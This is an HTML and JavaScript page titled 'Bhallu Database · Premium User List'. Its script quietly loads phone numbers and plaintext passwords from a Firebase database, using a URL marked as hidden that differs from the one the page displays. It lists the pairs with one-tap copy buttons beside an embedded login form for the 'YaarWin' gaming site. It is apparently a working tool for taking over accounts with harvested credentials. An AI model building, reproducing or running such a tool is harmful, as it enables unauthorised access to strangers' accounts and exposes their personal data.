<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>Bhallu Database · Premium User List</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0f1f;
            font-family: 'Segoe UI', 'Fira Code', monospace;
            padding: 20px;
            color: #e2e8f0;
        }
        .container {
            max-width: 1200px;
            width: 100%;
            margin: 0 auto;
        }
        h1 {
            font-size: 1.6rem;
            background: linear-gradient(135deg, #facc15, #f97316);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            margin-bottom: 4px;
        }
        .sub {
            color: #94a3b8;
            margin-bottom: 16px;
            font-size: 0.8rem;
        }
        .controls {
            background: #0f172a;
            border: 1px solid #334155;
            border-radius: 48px;
            padding: 12px 20px;
            display: flex;
            flex-wrap: wrap;
            gap: 12px;
            align-items: center;
            margin-bottom: 20px;
        }
        .url-group {
            flex: 2;
            min-width: 200px;
        }
        .url-group label {
            font-size: 0.7rem;
            color: #94a3b8;
            display: block;
            margin-bottom: 4px;
        }
        input {
            background: #1e293b;
            border: 1px solid #334155;
            border-radius: 40px;
            padding: 8px 14px;
            color: white;
            font-size: 0.8rem;
            width: 100%;
        }
        .search-group {
            display: flex;
            gap: 8px;
            flex-wrap: wrap;
        }
        .search-group input {
            width: 180px;
        }
        button {
            background: #3b82f6;
            border: none;
            padding: 6px 16px;
            border-radius: 40px;
            font-weight: bold;
            cursor: pointer;
            color: white;
            font-size: 0.75rem;
            transition: 0.2s;
        }
        button:hover { background: #2563eb; transform: translateY(-1px); }
        .show-data-btn { background: #10b981; }
        .data-container {
            background: #0f172a;
            border: 1px solid #2d3a5e;
            border-radius: 24px;
            overflow: hidden;
            margin-bottom: 20px;
        }
        .data-header {
            background: #1e293b;
            padding: 12px 20px;
            border-bottom: 1px solid #334155;
        }
        .stats {
            font-size: 0.85rem;
            color: #facc15;
            font-weight: 500;
        }
        .user-list {
            max-height: 500px;
            overflow-y: auto;
        }
        .user-list::-webkit-scrollbar { width: 10px; }
        .user-list::-webkit-scrollbar-track { background: #1e293b; border-radius: 10px; }
        .user-list::-webkit-scrollbar-thumb { background: #facc15; border-radius: 10px; }
        .user-row {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 12px 20px;
            border-bottom: 1px solid #1e2a3e;
            cursor: pointer;
            transition: all 0.2s ease;
        }
        .user-row:hover {
            background: rgba(250, 204, 21, 0.08);
            transform: translateX(5px);
        }
        .phone-number {
            color: #facc15;
            font-weight: 600;
            font-size: 0.9rem;
        }
        .password {
            color: #94a3b8;
            font-size: 0.9rem;
            font-family: monospace;
        }
        /* PREMIUM HIGHLIGHT EFFECT - Neon Glow + Golden Border + Scale */
        .user-row.highlight {
            background: linear-gradient(90deg, #facc15, #eab308);
            color: #0f172a;
            box-shadow: 0 0 15px rgba(250, 204, 21, 0.6), inset 0 0 10px rgba(255,255,200,0.3);
            border-left: 4px solid #fff;
            border-right: 4px solid #fff;
            transform: scale(1.01);
        }
        .user-row.highlight .phone-number,
        .user-row.highlight .password {
            color: #0f172a;
            font-weight: 700;
            text-shadow: 0 0 2px rgba(255,255,200,0.5);
        }
        .empty, .loading, .error {
            text-align: center;
            padding: 40px;
            color: #94a3b8;
        }
        .toast {
            position: fixed;
            bottom: 30px;
            left: 50%;
            transform: translateX(-50%);
            background: #1e293b;
            color: #facc15;
            padding: 8px 20px;
            border-radius: 40px;
            font-size: 0.8rem;
            z-index: 999;
            pointer-events: none;
            opacity: 0;
            transition: opacity 0.2s;
        }
        .yaarwin-bottom {
            background: #0f172a;
            border: 1px solid #2d3a5e;
            border-radius: 24px;
            overflow: hidden;
        }
        .yaarwin-label {
            background: #1e293b;
            padding: 10px 20px;
            font-size: 0.75rem;
            color: #facc15;
            border-bottom: 1px solid #334155;
            font-weight: 500;
        }
        .yaarwin-bottom iframe {
            width: 100%;
            height: 450px;
            border: none;
        }
        @media (max-width: 700px) {
            body { padding: 12px; }
            .controls { flex-direction: column; align-items: stretch; }
            .search-group input { width: 100%; }
            .user-list { max-height: 350px; }
            .phone-number, .password { font-size: 0.75rem; }
            .yaarwin-bottom iframe { height: 400px; }
        }
    </style>
</head>
<body>
<div class="container">
    <h1>📂 Bhallu Database · Premium User List</h1>
    <div class="sub">✨ Tap phone → copy number | Tap password → copy password ✨</div>

    <div class="controls">
        <div class="url-group">
            <label>🔥 Firebase URL</label>
            <input type="text" id="displayUrl" value="https://bhallu-ki-gaad-default-rtdb.asia-southeast1.firebasedatabase.app/.json" readonly>
        </div>
        <div class="search-group">
            <input type="text" id="searchInput" placeholder="🔍 Find phone/password">
            <button id="findBtn">Find</button>
            <button id="nextBtn">Next</button>
            <button id="clearBtn">Clear</button>
            <button id="refreshBtn">Refresh</button>
            <button id="showDataBtn" class="show-data-btn">📡 Show Data</button>
        </div>
    </div>

    <div class="data-container">
        <div class="data-header">
            <div class="stats" id="statsInfo">📊 Click "Show Data" to load</div>
        </div>
        <div id="userList" class="user-list">
            <div class="empty">✨ Press "Show Data"</div>
        </div>
    </div>

    <div class="yaarwin-bottom">
        <div class="yaarwin-label">🎮 YaarWin Login Portal</div>
        <iframe src="https://yaarwin.xyz/#/login" title="YaarWin Login" allow="clipboard-read; clipboard-write"></iframe>
    </div>
</div>
<div id="toastMsg" class="toast"></div>

<script>
    // 🔥 Alpha DB URL (hidden)
    const ALPHA_URL = "https://alphaaxriajjc-default-rtdb.asia-southeast1.firebasedatabase.app/.json";

    let allUsers = [];
    let matches = [];
    let matchIndex = -1;
    let currentSearch = '';

    const userListDiv = document.getElementById('userList');
    const statsSpan = document.getElementById('statsInfo');
    const searchInput = document.getElementById('searchInput');
    const toast = document.getElementById('toastMsg');

    function showToast(msg, isError = false) {
        toast.textContent = msg;
        toast.style.backgroundColor = isError ? '#b91c1c' : '#1e293b';
        toast.style.opacity = '1';
        setTimeout(() => { toast.style.opacity = '0'; }, 1500);
    }

    async function copyText(text, label) {
        try {
            await navigator.clipboard.writeText(text);
            showToast(`✅ ${label} copied: ${text.substring(0, 25)}${text.length > 25 ? '…' : ''}`);
        } catch (err) {
            const textarea = document.createElement('textarea');
            textarea.value = text;
            document.body.appendChild(textarea);
            textarea.select();
            document.execCommand('copy');
            document.body.removeChild(textarea);
            showToast(`📋 ${label} copied`, false);
        }
    }

    function extractUsers(obj, arr) {
        if (!obj || typeof obj !== 'object') return;
        if (obj.phone) {
            let phone = String(obj.phone);
            let pass = obj.password !== undefined ? String(obj.password) : '(no password)';
            arr.push({ phone, password: pass });
        }
        for (let val of Object.values(obj)) extractUsers(val, arr);
    }

    async function fetchData() {
        userListDiv.innerHTML = '<div class="loading">⏳ Fetching data...</div>';
        statsSpan.innerText = '⏳ Loading...';
        try {
            const controller = new AbortController();
            const timeout = setTimeout(() => controller.abort(), 20000);
            const res = await fetch(ALPHA_URL, { signal: controller.signal });
            clearTimeout(timeout);
            if (!res.ok) throw new Error(`HTTP ${res.status}`);
            const data = await res.json();
            const users = [];
            extractUsers(data, users);
            const map = new Map();
            for (let u of users) map.set(u.phone, u);
            allUsers = Array.from(map.values()).sort((a,b) => a.phone.localeCompare(b.phone));
            renderList();
            statsSpan.innerText = `📞 ${allUsers.length} users — tap to copy`;
            clearHighlight();
        } catch (err) {
            console.error(err);
            userListDiv.innerHTML = `<div class="error">❌ Error: ${err.message}<br>Check network/CORS.</div>`;
            statsSpan.innerText = '❌ Failed';
            allUsers = [];
        }
    }

    function renderList() {
        if (!allUsers.length) {
            userListDiv.innerHTML = '<div class="empty">No users found. Try "Show Data".</div>';
            return;
        }
        const frag = document.createDocumentFragment();
        for (let i = 0; i < allUsers.length; i++) {
            const u = allUsers[i];
            const row = document.createElement('div');
            row.className = 'user-row';
            row.setAttribute('data-idx', i);
            row.innerHTML = `
                <span class="phone-number">📞 ${escapeHtml(u.phone)}</span>
                <span class="password">🔑 ${escapeHtml(u.password)}</span>
            `;
            row.querySelector('.phone-number').onclick = (e) => {
                e.stopPropagation();
                copyText(u.phone, 'Phone');
            };
            row.querySelector('.password').onclick = (e) => {
                e.stopPropagation();
                copyText(u.password, 'Password');
            };
            frag.appendChild(row);
        }
        userListDiv.innerHTML = '';
        userListDiv.appendChild(frag);
    }

    function clearHighlight() {
        document.querySelectorAll('.user-row').forEach(row => row.classList.remove('highlight'));
        matches = [];
        matchIndex = -1;
        currentSearch = '';
        statsSpan.innerText = `📞 ${allUsers.length} users`;
    }

    function findAndHighlight() {
        if (!allUsers.length) { showToast('Load data first', true); return; }
        const term = searchInput.value.trim();
        if (!term) { clearHighlight(); return; }
        if (term === currentSearch && matches.length) { goToNext(); return; }
        currentSearch = term;
        const lower = term.toLowerCase();
        matches = [];
        for (let i=0; i<allUsers.length; i++) {
            const u = allUsers[i];
            if (u.phone.includes(lower) || u.password.toLowerCase().includes(lower)) matches.push(i);
        }
        if (!matches.length) {
            showToast(`No match for "${term}"`, true);
            clearHighlight();
            return;
        }
        document.querySelectorAll('.user-row').forEach(row => row.classList.remove('highlight'));
        for (let idx of matches) {
            const row = userListDiv.querySelector(`.user-row[data-idx='${idx}']`);
            if (row) row.classList.add('highlight');
        }
        matchIndex = 0;
        scrollToMatch();
        statsSpan.innerText = `🔍 ${matches.length} matches — ${matchIndex+1}/${matches.length}`;
    }

    function scrollToMatch() {
        if (matchIndex < 0 || matchIndex >= matches.length) return;
        const target = userListDiv.querySelector(`.user-row[data-idx='${matches[matchIndex]}']`);
        if (target) target.scrollIntoView({ behavior: 'smooth', block: 'center' });
        statsSpan.innerText = `🔍 ${matches.length} matches — ${matchIndex+1}/${matches.length}`;
    }

    function goToNext() {
        if (!matches.length) { if (searchInput.value.trim()) findAndHighlight(); else statsSpan.innerText = `📞 ${allUsers.length} users`; return; }
        matchIndex = (matchIndex + 1) % matches.length;
        scrollToMatch();
    }

    document.getElementById('findBtn').onclick = findAndHighlight;
    document.getElementById('nextBtn').onclick = goToNext;
    document.getElementById('clearBtn').onclick = () => { searchInput.value = ''; clearHighlight(); };
    document.getElementById('refreshBtn').onclick = fetchData;
    document.getElementById('showDataBtn').onclick = fetchData;
    searchInput.onkeypress = e => { if (e.key === 'Enter') findAndHighlight(); };

    function escapeHtml(str) {
        return str.replace(/[&<>]/g, m => m === '&' ? '&amp;' : (m === '<' ? '&lt;' : '&gt;'));
    }
</script>
</body>
</html>
